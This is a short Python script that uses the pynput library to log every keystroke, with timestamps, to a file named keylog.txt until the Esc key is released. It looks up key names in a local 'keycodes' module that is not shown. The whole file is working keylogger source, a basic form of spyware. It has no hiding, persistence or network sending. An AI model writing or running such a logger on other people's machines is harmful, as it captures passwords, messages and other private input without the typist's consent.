from pynput.keyboard import Key, Listener
import logging
from keycodes import keys

log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info(keys.get(key.vk, str(key)))
    except AttributeError:
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
